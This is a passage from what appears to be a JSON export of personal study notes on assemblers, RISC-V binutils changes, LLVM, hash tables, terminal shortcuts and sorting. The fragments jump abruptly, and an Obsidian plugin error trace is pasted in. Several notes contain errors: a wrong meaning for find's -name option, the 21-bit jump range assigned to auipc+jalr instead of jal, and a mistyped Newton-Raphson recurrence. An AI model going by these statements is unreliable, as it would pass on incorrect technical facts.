It prints disassembled instructions and matches opcodes and operands.\n\nAlso need to have target specific changes in `configure.in`, `disassemble.c` and `Makefile.am` files in the `opcodes` directory.\n\n**CGEN** will create these automatically for you.\n\n### Sections and Relocation\nA section is a **range of address with no gaps**. \n\nThe linker `ld` reads many object files and combines them into a runnable program. When the assembler emits an object file, the program is assumed to start at address 0. `ld` assigns the final addresses for the partial program, so that different programs don't overlap.\n\n`ld` moves blocks of bytes to their run-time addresses. These blocks slide as rigid units, their length doesn't change neither does the order of bytes. These are called **sections**. Assigning run-time addresses to sections is called **relocation**. It includes the task of adjusting mentions of object-file addresses so they refer to the proper run-time addresses.\n\nAn object file written by the assembler has at least three sections:\n- `text`\n- `data`\n- `bss`\n\nTo let `ld` know which data changes when the sections are relocated, and how to change that data, `as` also writes to the object file details of the relocation needed. `ld` must know this each time an address is mentioned:\n\n- Where in the object file is the beginning of this reference to an address?\n- How long (in bytes) is this reference?\n- Which section does the address refer to? What is the numeric value of `(address) - (start-address of section)`?\n- Is the reference to an address **program-counter relative**?\n\nEvery address `as` ever uses is expressed as `(section) + (offset into section)`.\n\n### Linker Sections\n![Screenshot from 2022-07-11 11-19-21](notes/images/Screenshot%20from%202022-07-11%2011-19-21.png)\n\n- **text** and **data** section:  they hold the program, they are treated as separate but equal sections. When the program is running however, the **text** section is unalterable as it is often shared among processes: it contains instructions, constants etc. The data section is usually alterable, for example C variables would be stored there.\n- **bss** section: it contains 0 bytes when the program begins running. It holds uninitialised variables or common storage.\n- **absolute** section: address 0 of this section is always \"relocated\" to runtime address 0. This is useful if you want to refer to an address that `ld` must not change when relocating.\n- **undefined** section: catch-all for address references to objects no in the preceding sections.\n\n#### Symbols\nThe programmer uses symbols to name things, the linker uses symbols to link, and the debugger uses symbols to debug.\n\n- `typedef` from `struct symbol` in `as.h`.\n- Defined in `symbols.c`.\n\n#### Labels\nThey are written as a symbol immediately followed by a colon `:`. The symbol then represents the current value of the active location counter, and is, for example, a suitable instruction operand.\n\nIf you use the same symbol to represent two different locations: first definition overrides any other definitions.\n\n#### Fixup\nMore [here](notes/general/fixups.md).\n\nAnything that cannot be resolved in the first pass.

It maps a **Key** to a **Value**.\n\nImportant to note that key and value could be **any type** of data structure.\n\nA hash table consists of an array of 'buckets', each of which stores a key-value pair. In order to locate the bucket where the key-value pair should be stored, the key is passed through a hashing function. This function returns an integer which is used as the pair's index in the array of buckets. When we want to retrieve a key-value pair, we supply the key to the same hashing function, receive its index, and use the index to find it in the array.\n\nArray indexing has algorithmic [complexity](notes/university/year2/cs2004/big-o-notation.md) `O(1)`, making hash tables fast at storing and retrieving data.\n\n- Hash tables are [vector](notes/general/vectors-arrays.md) with *n* entries.\n\nHash functions:\n- H(**k**) gives a key, **k**, yields a value in the range [0,n] (it is important to have an even distribution).\n- Store key, **k**, and value, **v**, at index H(**k**) in the [vector](notes/general/vectors-arrays.md).\n    - May end up with multiple keys with the same H(**k**).\n        - Build up a double linked list of entries (_open_ hash table).\n        - Use next available free slot (_closed_ hash table).\n\n## Efficiency\nHash function must have a good distribution and must be **large enough**. _Closed_ tables may run out of space, _open_ tables may get inefficiently large lists.\n\n- Algorithms exist for the [perfect hash function](https://en.wikipedia.org/wiki/Perfect_hash_function).\n\nA well design insertion and lookup is $O(1)$.\n\n## API\nAssociative arrays are a collection of unordered key-value pairs.

Instruction masks are used to hard code common encoding fields in the instruction, such as the opcode, and to mask preset bits with 1 in the operand encoding fields. You can see that how it is calculated here. So if you exclusive OR something with the MATCH, and all bits are the same as MASK, then the return will be 0 `((insn ^ MATCH) \u0026 MASK) == 0`.\n\n![Screenshot from 2022-07-20 13-35-38](notes/images/Screenshot%20from%202022-07-20%2013-35-38.png)\n\nHere it hard codes the source register, function, the destination register and the opcode. We then have our match field checking the encoding.\n\n- Match function: determines if a word corresponds to this instruction, if the instruction doesn't require additional assistance then you can use `match_opcode`. It checks the logic behind mask and match:\n\n```c\nstatic int\n\nmatch_opcode (const struct riscv_opcode *op, insn_t insn)\n{\n  return ((insn ^ op-\u003ematch) \u0026 op-\u003emask) == 0;\n}\n```\n\n- Pinfo: collection of bits describing the instruction, mainly any relevant hazard information.\n\n### Riscv-dis.c\nHere we add the instructions to the `print_insn_args` function, which disassembles the bit stream:\n\n```c\n/* CORE-V Specific.  */                                                       \n    case 'b':                                                                                              \n      if (oparg[1] == '1')                                                        \n        {                                                                                                  \n          info-\u003etarget = (EXTRACT_ITYPE_IMM (l)\u003c\u003c1) + pc; ++oparg;                                         \n          (*info-\u003eprint_address_func) (info-\u003etarget, info);                                                \n          break;                                                                                           \n         } \n```\n\n- `EXTRACT_ITYPE_UIMM (l)`: extracts only the required bits from `l`, defined in `include/opcode/riscv.h`:\n\n```c\n#define EXTRACT_CV_HWLP_UIMM5(x) \\                                                                       \n    (RV_X(x, 15, 5))\n```\n\n```c\n #define RV_X(x, s, n)  (((x) \u003e\u003e (s)) \u0026 ((1 \u003c\u003c (n)) - 1)) \n ```\n\nThen we go to `gas/config/tc-riscv.c` and add the instructions to the `validate_riscv_insn` function - which validates all bits in the instruction are set:\n\n```c\ncase 'd':                                                                                              \n      if (oparg[1] == 'i')                                                             \n        {                                                                              \n          used_bits |= ENCODE_CV_HWLP_LN(-1U);                                         \n          ++oparg;                                                                     \n          break;                                                                       \n        } \n```\n\nYou can see this `ENCODE_CV_HWLP_LN` macro in `include/opcode/riscv.h`:\n\n```c\n#define ENCODE_CV_HWLP_LN(x) \\                                                  \n   (RV_X(x, 0, 1) \u003c\u003c 7)  \n```\n\nAdd the operand to the `riscv_ip` function - which assembles an instruction into its binary format:\n\n```c\ncase 'd': /* Destination register.  */                                                             \n          if (oparg[1] == 'i')                                                    \n      {                                                                                                    \n        ++oparg;                                                                  \n        my_getExpression (imm_expr, asarg);                                                                \n        asarg = expr_end;                                                         \n        if (imm_expr-\u003eX_op != O_constant ||                                       \n            imm_expr-\u003eX_add_number \u003c 0 || imm_expr-\u003eX_add_number \u003e 1)             \n          as_bad (_(\"%s loop number must be 0 or 1\"),                                                      \n            ip-\u003einsn_mo-\u003ename);                                                   \n        INSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);                                                  \n        continue;                                                                                          \n      } \n```\n\nIf we look into `INSERT_OPERAND()`: to ensure that the it works correctly, in the RISC-V header file, a mask for the bits encoded for the operand, and the offset of the encoded bits must be defined. These are used in the `INSERT_OPERAND` macro along with the instructions opcode, and the actual value of the operand, to produce the instructions binary representation.\n\n- Add masks to `include/opcode/riscv.h`:\n\n```c\n#define OP_MASK_LN              0x1                                                                      \n#define OP_SH_LN                7\n```\n\n- `OP_MASK_LN`: bits encoded.\n- `OP_SH_LN`: first bit encoded position.\n\nUsed by:\n\n```c\n  /* Change INSN's opcode so that the operand given by FIELD has value VALUE.     \n     INSN is a riscv_cl_insn structure and VALUE is evaluated exactly once.  */   \n  #define INSERT_OPERAND(FIELD, INSN, VALUE) \\                                                             \n    INSERT_BITS ((INSN).insn_opcode, VALUE, OP_MASK_##FIELD, OP_SH_##FIELD)\n```\n\nUsage:\n\n```c\nINSERT_OPERAND (LN, *ip, imm_expr-\u003eX_add_number);\n```\n\n### Testing GAS\n- Input: `test.s`\n- Output: `test.d`\n\n- Tests are in:\n\n```bash\ngas/testsuite/gas/riscv/\n```\n\n- Settings: `riscv.exp`\n- Error output: `test.l`\n\nFor example `cv-hwloop-starti.s`:\n\n```assembly\ntarget:\n      cv.starti 0, 0\n      cv.starti 1, 3020\n      cv.starti 0, 4094\n```\n\nThen the output:\n\n```disassembly\n#as: -march=rv32i_xcorev\n#objdump: -d\n\n.*:[ \t]+file format .*\n\n\nDisassembly of section .text:\n\n0+000 \u003ctarget\u003e:\n[ \t]+0:[ \t]+0000007b[ \t]+cv.starti[ \t]+0,0 \u003ctarget\u003e\n[ \t]+4:[ \t]+5e6000fb[ \t]+cv.starti[ \t]+1,bd0 +\u003ctarget\\+0xbd0\u003e\n[ \t]+8:[ \t]+7ff0007b[ \t]+cv.starti[ \t]+0,1006 +\u003ctarget\\+0x1006\u003e\n```\n\nHere you can see me assembling it manually:\n\n```bash\npietraferreira@tom:~$ cat test-hwlp.s \u0026\u0026 riscv32-corev-elf-as -march=rv32imc_xcorev1p0 test-hwlp.s \u0026\u0026 riscv32-corev-elf-objdump -rd a.out \ncv.starti 0, 0\ncv.starti 1, 3020\ncv.starti 0, 4094 \n\na.out:     file format elf32-littleriscv\n\n\nDisassembly of section .text:\n\n00000000 \u003c.text\u003e:\n   0:\t0000007b          \tcv.starti\t0,0x0\n   4:\t5e6000fb          \tcv.starti\t1,0xbd0\n   8:\t7ff0007b          \tcv.starti\t0,0x1006\n```","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["work/engineer-training","help"]},"/notes/general/inkblot-algorithm":{"title":"Inkblot Algorithm","content":"# Inkblot Algorithm\n---\nCouldn't find much online about it, but I think it's a \"populating\" algorithm to find a path (A-\u003eB).\n\n## Maze\n![inkblot-1](notes/images/inkblot-1.png)\n\n![inkblot-2](notes/images/inkblot-2.png)\n\n## Recording the Path\nUse recursion and an accumulator.\n\n```c\nstruct path\n{\n  int x;\n  int y;\n  struct path *next;\n}\n```\n\n```c\nstruct route *\nblot (int x, int y, struct path *route)\n{\n  struct node *n = (struct node *) malloc (sizeof (*n));\n  if (x,y) is destination\n  {\n    n-\u003ex = x, n-\u003ey = y, n-\u003eroute = route;\n    return n;\n  }\n  else\n    for (each point (a,b) adjacent to (x,y)\n    {\n      n-\u003ex = x; n.y = y; n-\u003eroute = route;\n      newroute = blot (a, b, n);\n      if (newroute)\n        return newroute:\n    }\n  free (n);  /* Failure, give back node */\n  return NULL;\n}\n```\n\n## Contours\nWant the intermediate contour.\n\nInkblot from both sides until meet, may get artefacts but will be optimal.\n\n![contours](notes/images/contours.png)\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs","work/engineer-training"]},"/notes/general/instruction-set-semantics":{"title":"Instruction Set Semantics","content":"# Instruction Set Semantics\n---\nMost general is the **three address instruction set**:\n\n`result = operand1 operator operand2` ^44cfb5\n\n**Two address instruction sets** use one of the operand addresses for the **result**.\n\n**One address instruction sets** have a fixed register for one operand and the result, usually known as the _accumulator_.\n\n**Zero address instruction sets** work by popping arguments from a stack in main memory and pushing the results back.\n\nModern RISC designs are **three address instruction sets**.

Ctrl as modifier might also work on mac and non-mac keyboards/shells/apps.\nDelete previous word (in shell) | `Ctrl` + `W` | It's faster to delete by words.  Especially when your last command was wrong by a single typo or something.\nClear screen | `Ctrl` + `L` | This is telling the shell to do it instead of an explicit command like `clear` or `cls` in DOS.  If you use `⌘` + `K`, this is telling iTerm to clear the screen which might have the same result or do something terrible (like when using a TUI like `top` or `htop`.  In general, use this instead of typing `clear` over and over.\nExit Shell | `Ctrl` + `D` | Instead of typing exit, just get this in muscle memory.  It works in many contexts.\n\n\n\n## Moving Faster\n\nA lot of shell shortcuts work in iTerm2 and it's good to learn these because arrow keys, home/end\nkeys and Mac equivalents don't always work.  For example `⌘` + `Left Arrow` is usually the same as `Home`\n(go to beginning of current line) but that doesn't work in the shell.  Home works in many apps but it\ntakes you away from the home row.\n\n**Function** | **Shortcut**\n-------- | --------\nMove to the start of line | `Ctrl` + `A` or `Home`\nMove to the end of line | `Ctrl` + `E` or `End`\nMove forward a word | `Option` + `F`\nMove backward a word | `Option` + `B`\nSet Mark | `⌘` + `M`\nJump to Mark | `⌘` + `J`\nMoving by word on a line (this is a shell thing but passes through fine)| `Ctrl` + `Left/Right Arrow`\nCursor Jump with Mouse (shell and vim - might depend on config) | `Option` + `Left Click`\n\n\n## Copy and Paste with iTerm without using the mouse\n\nI don't use this feature too much.  I instead just mouse select (which copies to the clipboard) and paste.  There's no need to Copy to the clipboard if you have `General \u003e Selection \u003e Copy to pasteboard on selection` enabled.\n\n**Function** | **Shortcut**\n-------- | --------\nEnter Copy Mode | `Shift` + `⌘` + `C`\nEnter Character Selection Mode in Copy Mode | `Ctrl` + `V`\nMove cursor in Copy Mode | `HJKL` vim motions or arrow keys\nCopy text in Copy Mode | `Ctrl` + `K`\n\nCopy actions goes into the normal system clipboard which you can paste like normal.\n\n\n## Search the Command History\n\nSome of these are not directly related to iTerm and are just \"shell features\".  Like, if you open Terminal.app on Mac some of these still work because it's the shell and not iTerm.  I'm including them anyway.\n\n**Function** | **Shortcut**\n-------- | --------\nSearch as you type | `Ctrl` + `R` and type the search term; Repeat `Ctrl` + `R` to loop through result\nSearch the last remembered search term | `Ctrl` + `R` twice\nEnd the search at current history entry  | `Ctrl` + `Y`\nCancel the search and restore original line | `Ctrl` + `G`\n\n## Misc\n\n**Function** | **Shortcut**\n-------- | --------\nClear the screen/pane (when `Ctrl + L` won't work) | `⌘` + `K`  (I use this all the time)\nBroadcast command to all panes in window (nice when needed!) | `⌘` + `Alt` +  `I` (again to toggle)\nFind Cursor | `⌘` + `/`  _or use a theme or cursor shape that is easy to see_\n\n---\nSource: [GitHub - squarism](https://gist.github.com/squarism/ae3613daf5c01a98ba3a)\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["help"]},"/notes/general/knowledge-hub":{"title":"Knowledge Hub","content":"# Knowledge Hub\n\nWhere all of my notes live!!!

You can see how it is paired with the `R_RISCV_RELAX` relocation.\n\nIn RISC-V, there are two unconditional control transfer instructions: `jalr`, which jumps to an absolute address as specified by an immediate offset from a register; and `jal`, which jumps to a pc-relative offset as specified by an immediate. The only difference between the `auipc+jalr` pair and `jal` are that the pair can only address a 21-bit signed offset from the current PC, and that the `jal` instruction is half the size.\n\nThe compiler doesn't know if the offset between `_start` and `func` will fit within that range, so it is forced to generate the longer call. Because we don't want to impose this cost in cases where it is not necessary, we optimise it in the linker. This is a result of a linker relaxation:\n\n```bash\n$ riscv64-unknown-linux-gnu-objdump -d -r test\ntest:     file format elf64-littleriscv\n\nDisassembly of section .text:\n\n0000000000010078 \u003cfunc\u003e:\n   10078:       2505                    addiw   a0,a0,1\n   1007a:       8082                    ret\n\n000000000001007c \u003c_start\u003e:\n   1007c:       ffdff06f                j       10078 \u003cfunc\u003e\n```\n\nAs you can see, the linker knows that the call from `_start` to `func` fits within the 21-bit offset of the `jal` instruction and converts it to a single instruction.\n\n## Source\n- All Aboard, Part 3: Linker Relaxation in the RISC-V Toolchain ([here](https://www.sifive.com/blog/all-aboard-part-3-linker-relaxation-in-riscv-toolchain))\n\n---\n## Related Notes\n- [2022-07-03 - Relaxation](notes/private/work/2022-07-03-relaxation.md)\n- [Testing Relaxation - COREV](notes/private/work/testing-relaxation-corev.md)\n- [Fixups](notes/general/fixups.md)","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/compilers"]},"/notes/general/linux-fundamentals":{"title":"Linux Fundamentals","content":"# Linux Fundamentals\n---\n\nBunch of old notes on Linux stuff.\n\n## Find command\n\n``` \n\t-type f -\u003e type: file\n\n\t-name *.conf -\u003e all files owned by root\n\n\t-size +20k -\u003e larger than 20KiB\n\n\t-exec ls -al {} \\ -\u003e executes the specified command* \n\n\t2\u003e/dev/null -\u003e STDERR redirection to the null device\n\n\t-newermt 2020-03-03 -\u003e newer than this date\n```\n\n* the backlash escapes the next character from being interpreted by the\n  shell, otherwise the semicolon would terminate the command too soon.\n\n## File Descriptors\n\nThe file descriptor is an indicator of connection maintained by the kernel to\n\nperform Input/Output (I/O) operations.\n\n1.

Prebuilt binaries of the LLVM toolchain can be downloaded from the [LLVM Download Page](https://releases.llvm.org/download.html). The toolchain can also be built from source by following the instructions from their [documentation page](https://llvm.org/docs/). The toolchain contains the following top-level directories:\n\n```bash\nbin include lib libexec share\n```\n\nThe `bin` folder contains all the executable binaries, like the clang [compiler](notes/private/work/compilers.md) and a set of other useful tools such as clang-rename, clang-refactor, etc.\n\nThe `include` folder contains a set of header files that are included during compilation. For example, the C++ header files like iostream, etc. Notice that the C header files like `stdio.h` are not supplied with the toolchain because they are part of the [sysroot](notes/private/work/sysroot.md). It also contains header files that are used when using the llvm libraries to build tools.\n\nThe `lib` folder contains libraries like libc++, libc++abi, etc. These libraries may be used by the clang [compiler](notes/private/work/compilers.md) during the compilation process or can be used as a reusable set of libraries.\n\nThe `libexec` folder contains two Python scripts that are only relevant for using the clang static analyser.\n\nThe `share` folder contains the documentation which can be installed as _man_ pages and a non-essential set of scripts.\n\n## Three-phase design\nFront end, optimiser and back end (as most C compilers).\n\n- Front end: parses source code, checking it for errors and builds a language-specific Abstract Syntax Tree (AST) to represent the input code. The AST is optionally converted to a new representation for optimisation, and the optimiser and back end are run on the code.\n\n![three-phase-compiler](notes/images/three-phase-compiler.png)\n\n- Optimiser: responsible for transforming the code to improve running time, for example by eliminating redundant computations, and it is usually more of less independent of language and target.\n\n- Back end: aka code generator, maps the code onto the target instruction set. It is also responsible for generating good code that takes advantage of the unusual features of the supported architecture. Common parts of a compiler back end are: instruction selection, register allocation and instruction scheduling.\n\nThe most important win of this classical design comes when a compiler decides to support multiple source languages or target architectures. If the compiler uses a common code representation in its optimiser, then a front end can be written for any language that can compile to it, and a back end can be written for any target that can compile from it (as seen bellow).\n\n![retargetability](notes/images/retargetability.png)\n\n## LLVM Intermediate Representation (IR)\nIs the form LLVm uses to represent code in the compiler. It is designed to host mid-level analyses and transformations that can be found in the optimisation phase.\n\nIt was designed with many specific goals in mind, including supporting lightweight runtime optimisation, cross-function/inter-procedural optimisations, whole program analyses and aggressive restructuring transformations. \n\nThe most important aspect however, is that it is itself defined as a first class language with well-defined semantics. Here is a simple example of a `.ll` file:\n\n```LLVM\ndefine i32 @add1(i32 %a, i32 %b) {  \nentry:  \n    %tmp1 = add i32 %a, %b  \n    ret i32 %tmp1  \n}  \ndefine i32 @add2(i32 %a, i32 %b) {  \nentry:  \n    %tmp1 = icmp eq i32 %a, 0  \n    br i1 %tmp1, label %done, label %recurse  \nrecurse:  \n    %tmp2 = sub i32 %a, 1  \n    %tmp3 = add i32 %b, 1  \n    %tmp4 = call i32 @add2(i32 %tmp2, i32 %tmp3)  \n    ret i32 %tmp4  \ndone:  \n    ret i32 %b\n```\n\n- Which corresponds to this C code:\n\n```c\nunsigned add1(unsigned a, unsigned b) {\n  return a + b;\n}\n\nunsigned add2(unsigned a, unsigned b) {\n  if (a == 0) {\n    return b;\n  }\n\n  return add2(a - 1, b + 1);\n}\n```\n\nAs you can see, the instructions (in LLVM IR) are in [three address form](notes/private/work/three-address-code.md), which means they take some number of inputs and produce a result in a different register.\n\nIt also does not use a fixed set of named registers, it uses an infinite set of temporaries named with a `%` character.\n\nBeyond being implemented as a language, LLVM IR is actually defined in three isomorphic forms: the textual format above, an in-memory data structure inspected and modified by optimisations themselves, and an efficient and dense on-disk binary “bitcode” format. The LLVM Project also provides tools to convert the on-disk format from text to binary: llvm-as assembles the textual .ll file into a .bc file containing the bitcode goop and llvm-dis turns a .bc file into a .ll file.  \n\nThe intermediate representation of a compiler is interesting because it can be a “perfect world” for the compiler optimiser: unlike the front end and back end of the compiler, the optimiser isn’t constrained by either a specific source language or a specific target machine. On the other hand, it has to serve both well: it has to be designed to be easy for a front end to generate and be expressive enough to allow important optimisations to be performed for real targets\n\n## LLVM's Target Description Files: .td\nEach shared component needs to be able to reason about target specific properties in a generic way. For example, a shared register allocator needs to know the register file of each target and the constraints that exist between instructions and their register operands.\n\nLLVM's solution to this is for each target to provide a **target description** in a declarative domain-specific language (a set of `.td` files) processed by the **tblgen** tool. Here is the build process for the x86 target:\n\n![x86-target-definition-example](notes/images/x86-target-definition-example.png)\n\nThe different subsystems supported by the `.td` files allow target authors to build up the different pieces of their target. For example, the x86 back end defines a register class that holds all of its 32-bit registers name \"GR32\", like this:\n\n```LLVM\ndefine GR32 : RegisterClass\u003c[i32], 32,\n  [EAX, ECX, EDX, ESI, EDI, EBX, EBP, ESP,  \n   R8D, R9D, R10D, R11D, R14D, R15D, R12D, R13D]\u003e { ... }\n```\n\nThe language used in the `.td` files are Target(Hardware) Description Language that let lvvm backend compiler engineers to define the transformations for llvm IR and the machine instructions of their CPUs. \n\nIn frontend, compiler development tools provide the \"ParseGenerator\" for compiler development; in backend they provide the \"Machine Code Generator\" for development, as you can see below:\n\n![front-tablegen-flow](notes/images/front-tablegen-flow.png)\n\n![notes/imagesllvm-tablegen-flow.png](notes/imagesllvm-tablegen-flow.png)\n\n## Code Generation Sequence\nFrom tricore_llvm.pdf:\n\n![llvm-code-generation-sequence](notes/images/llvm-code-generation-sequence.png)\n\nLLVM is a Static Single Assignment (SSA) based representation. LLVM provides an infinite virtual registers which can hold values of primitive type (integral, floating point, or pointer values). So, every operand can be saved in different virtual register in llvm SSA representation. Comment is “;” in llvm representation. Following is the llvm SSA instructions:\n\n```LLVM\nstore i32 0, i32* %a  ; store i32 type of 0 to virtual register %a, %a is  \n                      ; pointer type which point to i32 value  \nstore i32 %b, i32* %c ; store %b contents to %c point to, %b isi32 type virtual  \n                      ; register, %c is pointer type which point to i32 value.  \n%a1 = load i32* %a    ; load the memory value where %a point to and assign the  \n                      ; memory value to %a1  \n%a3 = add i32 %a2, 1  ; add %a2 and 1 and save to %a3\n```\n\nHere you can see the code generation process:\n\n1. Instruction Selection\n```LLVM\n; In this stage, transfer the llvm opcode into machine opcode, but the operand  \n; still is llvm virtual operand.  \n   store i16 0, i16* %a ; store 0 of i16 type to where virtual register %a  \n                        ; point to.  \n=\u003e st i16 0, i32* %a    ; Use Cpu0 backend instruction st instead of IR store.\n```\n\n2. Scheduling and Formation\n```LLVM\n; In this stage, reorder the instructions sequence for optimization in  \n; instructions cycle or in register pressure.  \n   st i32 %a, i16* %b, i16 5 // st %a to *(%b+5)  \n   st %b, i32* %c, i16 0  \n   %d = ld i32* %c  \n; Transfer above instructions order as follows. In RISC CPU of Mips, the ld  \n; %c uses the result of the previous instruction st %c. So it must waits 1  \n; cycle. Meaning the ld cannot follow st immediately.  \n=\u003e st %b, i32* %c, i16 0  \n   st i32 %a, i16* %b, i16 5  \n   %d = ld i32* %c, i16 0  \n; If without reorder instructions, a instruction nop which do nothing must be  \n; filled, contribute one instruction cycle more than optimization. (Actually,  \n; Mips is scheduled with hardware dynamically and will insert nop between st  \n; and ld instructions if compiler didn't insert nop.)  \n   st i32 %a, i16* %b, i16 5  \n   st %b, i32* %c, i16 0  \n   nop  \n   %d = ld i32* %c, i16 0  \n; Minimum register pressure  \n; Suppose %c is alive after the instructions basic block (meaning %c will be  \n; used after the basic block), %a and %b are not alive after that.  \n; The following no-reorder-version need 3 registers at least  \n   %a = add i32 1, i32 0  \n   %b = add i32 2, i32 0  \n   st %a, i32* %c, 1  \n   st %b, i32* %c, 2  \n; The reorder version needs 2 registers only (by allocate %a and %b in the same  \n; register)  \n=\u003e %a = add i32 1, i32 0  \n   st %a, i32* %c, 1  \n   %b = add i32 2, i32 0  \n   st %b, i32* %c, 2\n```\n\n3. SSA-based Machine Code Optimisation\n\n4. Register Allocation\nAllocate real register for virtual register.\n\n5. Prologue/Epilogue Code Insertion\n\n6. Late Machine Code Optimisations\nAny 'last-minute' peephole optimisations for the final machine code can be applied during this phase.\n\n7. Code Emission\nFor static compilation, the end result is an assembly code file. For JIT compilation, the opcodes of the machine instructions are written into memory.\n\n## LLVM vs GCC in structure\nRelated to [gcc](notes/general/gcc.md).\n\n![gcc-vs-llvm-structure](notes/images/gcc-vs-llvm-structure.png)\n\n## Online resources\n-   [LLVM Compiler Infrastructure documentation](https://llvm.org/docs/)\n-   [LLVM YouTube channel](https://www.youtube.com/channel/UCv2_41bSAa5Y_8BacJUZfjQ)\n- [Tutorial LLVM backend](https://jonathan2251.github.io/lbd/TutorialLLVMBackendCpu0.pdf)\n- [LLVM Backend - Code Generator](https://llvm.org/docs/CodeGenerator.html)\n- [LLVM Official Tutorials](https://llvm.org/docs/tutorial/)\n- [Writing Your Own Toy Compiler Using Flex, Bison and LLVM](https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/)\n\n### Mailing lists\n-   [The llvm-dev Archives](https://lists.llvm.org/pipermail/llvm-dev/)\n\n## Resources\n- [How to Write a LLVM Backend](notes/private/work/how-to-write-a-llvm-backend.md)\n\n\u003e [!failure]- Failure \n\u003e   Error: There is another generation process\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:56949 TextGenerator.eval\n\u003e     plugin:obsidian-textgenerator-plugin:56949:31\n\u003e   \n\u003e   - Generator.next\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:78 eval\n\u003e     plugin:obsidian-textgenerator-plugin:78:61\n\u003e   \n\u003e   - new Promise\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:62 __async\n\u003e     plugin:obsidian-textgenerator-plugin:62:10\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:56935 TextGenerator.generate\n\u003e     plugin:obsidian-textgenerator-plugin:56935:12\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:58440 AutoSuggest.eval\n\u003e     plugin:obsidian-textgenerator-plugin:58440:52\n\u003e   \n\u003e   - Generator.next\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:78 eval\n\u003e     plugin:obsidian-textgenerator-plugin:78:61\n\u003e   \n\u003e   - new Promise\n\u003e   \n\u003e  \n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/compilers/llvm"]},"/notes/general/newton-raphson":{"title":"Newton-Raphson Iteration","content":"# Newton-Raphson Iteration\n---\nWant to find the root of $f(x)$, for example a value for $x$ such that $f(x) = 0$.\n\nNewton-Raphson starts with an initial estimate, $x_0$, and computes a better estimate, $x_1$\n$x_1 = x_0 - \\dfrac {f(x_0)}{f'(x_0)}$\n\nFor example, to compute $\\dfrac {1}{b}$, we use:\n$f(x) = \\dfrac {1}{x} - b$\n        $=$ $x^{-1} - b$\n        \n$f'(x) = -x^{-2}$\n\nLeading to the formula:\n$x_1 = x_0 - \\dfrac {x_0^{-1} - b}{-x_0^{-2}}$\n     $=$ $2x_0 - bx_0^{2}$\n\n## Division\n$c = \\dfrac {a}{b}$\n\nCompute $r = \\dfrac {1}{b}$, then $c = r * a$\n\nAlgorithm:\n  - $r_0$ as guess for $\\dfrac {1}{b}$.\n  - $r_{i+1} = 2r_i = br_i^{2}$ (Newton-Raphson)\n\nSecond order convergent, so $O(log\\ r)$.\n\n---\n## See Also\n- [](notes/university/year2/cs2004/algorithms-and-data-structure.md#Mathematical%20Algorithms|Mathematical%20Algorithms)","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs","work/engineer-training"]},"/notes/general/p-vs-np":{"title":"P vs NP Problem","content":"# P vs NP Problem\n---\nImagine an Oracle.

Taking best of low, high and mid points deals with the obvious case of sorted data.\n\nIt is implemented as **qsort** in the standard C maths library.\n\n## Quicksort Partition\n```c\nint\npartition (int *a, int lo, int hi)\n{\n  int pivot = a[lo];            /* Guess median */\n  int i = lo - 1, j = hi + 1;\n\n  while (1)\n  {\n    do                          /* Leftmost element \u003e= pivot */\n      i++;\n    while (a[i] \u003c pivot);\n    do                          /* Rightmost element \u003c= pivot */\n      j--;\n    while(a[j] \u003e pivot);\n    if (i \u003e= j)\n      return j;\n    swap (\u0026(a[i]), \u0026(a[j]));\n  }\n}\n```\n\n### Output\n```bash\n16 16  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 15 16\n16 16  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 15 16\n16 15  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 16 16\n16 15  0 14  9 11 10  2  3  4  1 11  8 12 14  5 11 17 16 16\n11 15  0 14  9 11 10  2  3  4  1 11  8 12 14  5 16 17 16 16\n 5 15  0 14  9 11 10  2  3  4  1 11  8 12 14 11 16 17 16 16\n 5  8  0 14  9 11 10  2  3  4  1 11 15 12 14 11 16 17 16 16\n 5  8  0 11  9 11 10  2  3  4  1 14 15 12 14 11 16 17 16 16\n 5  8  0 11  9  1 10  2  3  4 11 14 15 12 14 11 16 17 16 16\n 4  8  0 11  9  1 10  2  3  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0 11  9  1 10  2  8  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0  2  9  1 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0  2  1  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 1  3  0  2  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  3  1  2  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  2  1  3  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5 10 11  8  9 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8 11 10  9 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 15 12 14 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 14 12 15 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 15 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n```\n\n### As a tree-sort\n![quicksort-tree](notes/images/quicksort-tree.png)\n\n## Code Example\n```c\n/* Basic Quicksort\n\n   Copyright (C) 2020 Embecosm Limited \u003cwww.embecosm.com\u003e\n   Contributor: Jeremy Bennett \u003cjeremy.bennett@embecosm.com\u003e\n   